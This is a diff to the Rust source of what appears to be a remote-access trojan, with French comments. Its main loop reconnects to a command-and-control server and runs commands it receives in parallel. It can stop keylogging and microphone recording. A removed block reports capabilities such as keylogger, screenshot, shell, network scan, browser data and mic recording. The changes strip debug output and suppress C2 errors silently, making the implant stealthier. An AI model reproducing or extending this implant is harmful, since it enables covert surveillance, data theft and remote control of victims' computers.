@@ -41,7 +41,11 @@ async fn main() {
     loop {
         match connexion::connect_to_c2().await {
             Ok(_) => {
-                println!("[+] Connecté au C2 après {} tentatives", retry_count);
+                if retry_count > 0 {
+                    println!("[+] Connecté au C2 après {} tentatives", retry_count);
+                } else {
+                    println!("[+] Connecté au C2");
+                }
                 break;
             }
             Err(e) => {
@@ -55,27 +59,6 @@ async fn main() {
                 // Exponential backoff, max 60 seconds
                 base_delay = std::time::Duration::from_secs((base_delay.as_secs() * 2).min(60));
             }
-        }
-    }
-    
-    let _ = connexion::ping_c2().await;
-    println!("[+] Ping C2 envoyé");
-
-    if let Some(cmd_map) = poly::get_command_map() {
-        let mapping = connexion::CommandMapping {
-            keylogger: cmd_map.get("keylogger").unwrap().clone(),
-            screenshot: cmd_map.get("screenshot").unwrap().clone(),
-            logs: cmd_map.get("logs").unwrap().clone(),
-            shell: cmd_map.get("shell").unwrap().clone(),
-            network_scan: cmd_map.get("network_scan").unwrap().clone(),
-            browser_info: cmd_map.get("browser_info").unwrap().clone(),
-            mic_rec: cmd_map.get("mic_rec").unwrap().clone(),
-        };
-
-        if let Err(e) = connexion::send_mapping(&mapping).await {
-            eprintln!("Erreur envoi mapping: {}", e);
-        } else {
-            println!("[+] Mapping envoyé avec succès");
         }
     }
     
@@ -104,63 +87,65 @@ async fn main() {
                 }
                 Ok(n) => {
                     let data = String::from_utf8_lossy(&buffer[..n]);
-                    println!("[DEBUG] Données reçues ({}): {}", n, data);
                     
                     if let Ok(json) = serde_json::from_str::<serde_json::Value>(&data) {
-                        println!("[DEBUG] JSON parsé: {:?}", json);
+                        // Vérifie s'il y a une erreur du C2
+                        if json.get("error").is_some() {
+                            // Ignore les erreurs silencieusement
+                            continue;
+                        }
+                        
                         if let Some(commands_array) = json.get("commands").and_then(|v| v.as_array()) {
                             let commands: Vec<String> = commands_array
                                 .iter()
                                 .filter_map(|v| v.as_str().map(String::from))
                                 .collect();
                             
-                            drop(socket_guard);
-                            
-                            println!("[+] Commands received: {:?}", commands);
-                            let mut handles: Vec<JoinHandle<()>> = Vec::new();
-                            let mut already_in_queue: HashSet<String> = HashSet::new();
-                            
-                            for command in commands {
-                                if let Some(num) = command.strip_prefix("stop ") {
-                                    if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
-                                    {
-                                        println!("[+] Arrêt demandé pour {}", cmd_name);
-                                        if *cmd_name == "keylogger" {
-                                            input::stop_keylogger();
+                            if !commands.is_empty() {
+                                drop(socket_guard);
+                                
+                                println!("[+] Commandes reçues: {:?}", commands);
+                                let mut handles: Vec<JoinHandle<()>> = Vec::new();
+                                let mut already_in_queue: HashSet<String> = HashSet::new();
+                                
+                                for command in commands {
+                                    if let Some(num) = command.strip_prefix("stop ") {
+                                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num)
+                                        {
+                                            println!("[+] Arrêt demandé pour {}", cmd_name);
+                                            if *cmd_name == "keylogger" {
+                                                input::stop_keylogger();
+                                            }
+                                            if *cmd_name == "mic_rec" {
+                                                mic_rec::stop_mic_rec();
+                                            }
+                                            let _ = connexion::send_directive_status(
+                                                &format!("stop {}", num),
+                                                "success",
+                                                "Session terminée",
+                                            )
+                                            .await;
                                         }
-                                        if *cmd_name == "mic_rec" {
-                                            mic_rec::stop_mic_rec();
-                                        }
-                                        let _ = connexion::send_directive_status(
-                                            &format!("stop {}", num),
-                                            "success",
-                                            "Session terminée",
-                                        )
-                                        .await;
+                                        continue;
                                     }
-                                    continue;
+
+                                    if already_in_queue.contains(&command) {
+                                        continue;
+                                    }
+
+                                    already_in_queue.insert(command.clone());
+
+                                    let cmd = command.clone();
+                                    let handle = tokio::spawn(async move {
+                                        poly::execute_poly_command(&cmd).await;
+                                    });
+                                    handles.push(handle);
                                 }
-
-                                if already_in_queue.contains(&command) {
-                                    continue;
+                                for handle in handles {
+                                    let _ = handle.await;
                                 }
-
-                                already_in_queue.insert(command.clone());
-
-                                let cmd = command.clone();
-                                let handle = tokio::spawn(async move {
-                                    poly::execute_poly_command(&cmd).await;
-                                });
-                                handles.push(handle);
                             }
-                            for handle in handles {
-                                let _ = handle.await;
-                            }
-                        } else {
-                            println!("[DEBUG] Pas de champ 'commands' dans le JSON");
                         }
-                    } else {
-                        println!("[DEBUG] Erreur parsing JSON: {}", data);
                     }
                 }
                 Err(e) => {
